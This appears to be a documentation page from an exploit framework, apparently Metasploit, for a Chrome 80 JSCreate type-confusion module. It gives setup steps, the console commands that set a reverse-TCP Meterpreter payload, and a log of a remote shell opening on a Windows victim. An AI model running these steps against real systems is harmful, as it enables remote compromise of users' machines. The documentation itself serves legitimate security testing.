{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/multi/browser/chrome_jscreate_sideeffect","result":{"data":{"moduleMetadataJson":{"id":"b5529e88-fde0-5931-810c-a048aa5e0b35","name":"Google Chrome 80 JSCreate side-effect type confusion exploit","fullname":"exploit/multi/browser/chrome_jscreate_sideeffect","description":"This module exploits an issue in Google Chrome 80.0.3987.87 (64 bit). The exploit\n      corrupts the length of a float array (float_rel), which can then be used for out\n      of bounds read and write on adjacent memory.\n      The relative read and write is then used to modify a UInt64Array (uint64_aarw)\n      which is used for read and writing from absolute memory.\n      The exploit then uses WebAssembly in order to allocate a region of RWX memory,\n      which is then replaced with the payload shellcode.\n      The payload is executed within the sandboxed renderer process, so the browser\n      must be run with the --no-sandbox option for the payload to work correctly.","rank":0,"fields":{"detailsSlug":"/modules/details/exploit/multi/browser/chrome_jscreate_sideeffect","documentationSlug":"/modules/documentation/exploit/multi/browser/chrome_jscreate_sideeffect"},"documentation":{"html":"<p>This module exploits an issue in Google Chrome 80.0.3987.87 (64 bit). The exploit corrupts the length of a float array (float<em>rel), which can then be used for out of bounds read and write on adjacent memory.\nThe relative read and write is then used to modify a UInt64Array (uint64</em>aarw) which is used for read and writing from absolute memory.\nThe exploit then uses WebAssembly in order to allocate a region of RWX memory, which is then replaced with the payload shellcode.</p>\n<p><strong>The payload is executed within the sandboxed renderer process, so the browser must be run with the --no-sandbox option for the payload to work correctly.</strong></p>\n<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>The module is compatible with any 64bit Google Chrome (version 80), on any platform (macOS, Linux or Windows), however the code that writes the shellcode into the rwx region (wasm<em>rwx</em>addr) may need to be modified for different versions.</p>\n<p><strong>Vulnerable Application Installation Steps</strong></p>\n<p>You can download a vulnerable Chrome version from this location:\n<a href=\"https://www.filepuma.com/download/google_chrome_64bit_80.0.3987.87-24545/\">https://www.filepuma.com/download/google<em>chrome</em>64bit_80.0.3987.87-24545/</a></p>\n<p>You should ensure that application does not update itself to the latest version (by disabling automatic updates or simply not connecting to the internet).\nYou may also need to disable Windows Defender.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Do: <code class=\"language-text\">use exploit/multi/browser/chrome_jscreate_sideeffect</code></li>\n<li>Do: <code class=\"language-text\">set payload windows/x64/meterpreter/reverse_tcp</code></li>\n<li>Do: <code class=\"language-text\">set LHOST [IP]</code></li>\n<li>Do: <code class=\"language-text\">set SRVHOST [IP]</code></li>\n<li>Do: <code class=\"language-text\">set URIPATH / [PATH]</code></li>\n<li>Do: <code class=\"language-text\">run</code></li>\n</ol>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"windows-10-and-google-chrome-800398787-with---no-sandbox\" style=\"position:relative;\"><a href=\"#windows-10-and-google-chrome-800398787-with---no-sandbox\" aria-label=\"windows 10 and google chrome 800398787 with   no sandbox permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Windows 10 and Google Chrome 80.0.3987.87 with --no-sandbox</h3>\n<p>Start Google Chrome without a sandbox:</p>\n<p><code class=\"language-text\">&quot;C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe&quot; --no-sandbox</code></p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; use exploit/multi/browser/chrome_jscreate_sideeffect\nmsf5 exploit(multi/browser/chrome_jscreate_sideeffect) &gt; set URIPATH /\nURIPATH =&gt; /\nmsf5 exploit(multi/browser/chrome_jscreate_sideeffect) &gt; set SRVHOST 192.168.56.1\nSRVHOST =&gt; 192.168.56.1\nmsf5 exploit(multi/browser/chrome_jscreate_sideeffect) &gt; set PAYLOAD windows/x64/meterpreter/reverse_tcp\nPAYLOAD =&gt; windows/x64/meterpreter/reverse_tcp\nmsf5 exploit(multi/browser/chrome_jscreate_sideeffect) &gt; set LHOST 192.168.56.1\nLHOST =&gt; 192.168.56.1\nmsf5 exploit(multi/browser/chrome_jscreate_sideeffect) &gt; exploit\n[*] Exploit running as background job 0.\n[*] Exploit completed, but no session was created.\nmsf5 exploit(multi/browser/chrome_jscreate_sideeffect) &gt;\n[*] Started reverse TCP handler on 192.168.56.1:4444\n[*] Using URL: http://192.168.56.1:8080/\n[*] Server started.\n\nmsf5 exploit(multi/browser/chrome_jscreate_sideeffect) &gt;\n[*] 192.168.56.3     chrome_jscreate_sideeffect - Sending / to Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36\n[*] Sending stage (206403 bytes) to 192.168.56.3\n[*] Meterpreter session 1 opened (192.168.56.1:4444 -&gt; 192.168.56.3:49677) at 2020-03-04 21:22:38 +0800\n\nmsf5 exploit(multi/browser/chrome_jscreate_sideeffect) &gt; sessions 1\n[*] Starting interaction with 1...\n\nmeterpreter &gt; pwd\nC:\\Program Files (x86)\\Google\\Chrome\\Application\\80.0.3987.87\nmeterpreter &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"b5529e88-fde0-5931-810c-a048aa5e0b35"}}}